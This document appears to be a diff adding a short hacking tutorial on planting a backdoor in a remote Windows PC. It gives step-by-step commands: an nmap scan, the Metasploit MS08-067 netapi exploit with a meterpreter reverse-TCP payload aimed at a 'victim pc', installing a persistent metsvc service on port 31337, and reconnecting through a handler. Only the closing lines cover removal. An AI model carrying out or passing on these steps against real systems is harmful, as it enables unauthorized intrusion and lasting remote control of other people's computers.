@@ -1,0 +1,39 @@
+
+How to Create Backdoor in Remote PC (metsvc Tutorial)
+
+Open your backtrack Terminal and type nmap –sV 192.168.1.56
+The results above are showing that the port 445 is open so we will try to use the netapi exploit.
+The microsoft-ds are a very common service in Windows machines. Most of the servers will have this service enabled so it will be very easy to exploit them except if they are using a firewall that filters the port 445.
+
+Open backtrack terminal and type msfconsole
+
+Now Type “Search “netapi “command in the console, this command will search for the entire exploit modules with the pattern”netapi“
+
+Now type use exploit/windows/smb/ms08_067_netapi
+Msf exploit (ms08_067_netapi)>set payload windows/meterpreter/reverse_tcp
+Msf exploit (ms08_067_netapi)>set lhost 192.168.1.2 (IP of Local Host)
+Msf exploit (ms08_067_netapi)>set rhost 192.168.1.56 (IP of Local Host)
+Msf exploit (ms08_067_netapi)>exploit
+Now you can get access of victim pc
+
+Now type metsvc –A This command will upload some files and it will create a windows service on the remote machine
+The backdoor will run on port 31337
+
+Now we will reboot the system.
+Now Open backtrack terminal type msfconsole
+use exploit/multi/handler
+set payload windows/metsvc_bind_tcp
+set rhost 192.168.1.56 (IP of Victim PC)
+set lport 31337
+exploit 
+Now you can access meterpreter shell on victim computer.
+
+Open your run dialog box and type services.msc
+Search for meterpreter.
+Right Click on meterpreter and stop the services
+
+Now open windows registry editor and find metsvc
+
+Right Click on metsvc-server and Delete registry value.
+
+Now Reboot your PC. Backdoor is successfully removed in your PC
